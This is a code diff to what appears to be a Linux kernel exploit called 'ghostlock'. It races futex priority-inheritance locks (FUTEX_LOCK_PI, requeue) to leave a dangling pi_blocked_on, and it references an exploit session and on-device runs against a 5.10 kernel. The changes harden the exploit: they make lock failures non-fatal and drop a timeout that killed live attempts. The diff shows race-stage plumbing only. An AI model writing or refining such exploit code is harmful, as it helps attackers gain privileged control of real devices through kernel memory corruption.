@@ -17,6 +17,8 @@
 #include <cstdio>
 #include <cstring>
 
+#include "common.h" /* v11.2: pr_step — non-fatal race-window logging */
+
 using namespace ghostlock;
 
 namespace {
@@ -168,7 +170,10 @@ namespace ghostlock::race {
                                             FUTEX_LOCK_PI, 0, nullptr,
                                             nullptr, 0);
         if (chain_lock != 0) {
-            pr_error("waiter lock chain errno=%d\n", errno);
+            /* v11.2: non-fatal (was pr_error => exit(-1)). chain=0 at this
+             * point (PiRace::reset), so a failure here is unexpected but
+             * must not kill the run. */
+            pr_step("waiter lock chain errno=%d\n", errno);
         }
         race->waiter_ready.store(1);
         while (!race->owner_started.load())
@@ -224,7 +229,9 @@ namespace ghostlock::race {
                                               FUTEX_UNLOCK_PI, 0, nullptr,
                                               nullptr, 0);
         if (chain_unlock != 0) {
-            pr_error("waiter unlock chain errno=%d\n", errno);
+            /* v11.2: non-fatal (was pr_error => exit(-1)). Signal the
+             * owner and bail out of this attempt only. */
+            pr_step("waiter unlock chain errno=%d\n", errno);
             race->owner_stop.store(1);
             return nullptr;
         }
@@ -242,7 +249,7 @@ namespace ghostlock::race {
         race->owner_tid.store(static_cast<int32_t>(syscall(SYS_gettid)));
         long lock_target = support::futex_op(
             &race->target_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
-        if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
+        if (lock_target != 0) pr_step("owner lock target errno=%d\n", errno);
         while (!race->waiter_ready.load() &&
                !race->owner_stop.load())
             usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
@@ -257,19 +264,20 @@ namespace ghostlock::race {
          * before the CMP requeue fires; the waiter's post-route UNLOCK_PI
          * wakes us here. The v6 "no chain LOCK" workaround silently removed
          * the cycle and with it the dangling pi_blocked_on the route lives
-         * on (run15: clean=1/1, zero writes). The 400s absolute timeout is
-         * a codex-review guard: the route deadline (300s) is shorter, so
-         * on any normal path the waiter's UNLOCK_PI arrives first and the
-         * timeout never fires; it only prevents an unkillable join if the
-         * unlock was lost. */
-        struct timespec chain_to;
-        SYSCHK(clock_gettime(CLOCK_MONOTONIC, &chain_to));
-        chain_to.tv_sec += 400;
+         * on (run15: clean=1/1, zero writes).
+         * v11.2: the v11.1 400s CLOCK_MONOTONIC timeout returned ETIMEDOUT
+         * immediately on-device (first live run died at route entry,
+         * exit 255 via pr_error) — whatever the kernel's timeout semantics
+         * for LOCK_PI is on 5.10, the guard misfired. The CLI runs this
+         * exact lock with timeout=NULL (6/6 on this kernel), so do the
+         * same; a genuinely lost unlock parks the owner until the main
+         * route deadline tears the process down (fail_stop, exit 70). */
         long chain_block = support::futex_op(&race->chain_futex,
-                                             FUTEX_LOCK_PI, 0, &chain_to,
+                                             FUTEX_LOCK_PI, 0, nullptr,
                                              nullptr, 0);
         if (chain_block != 0) {
-            pr_error("owner lock chain errno=%d\n", errno);
+            /* v11.2: non-fatal (was pr_error => exit(-1)). */
+            pr_step("owner lock chain errno=%d\n", errno);
         }
         race->owner_chain_done.store(1);
         while (!race->owner_stop.load()) sleep(1);
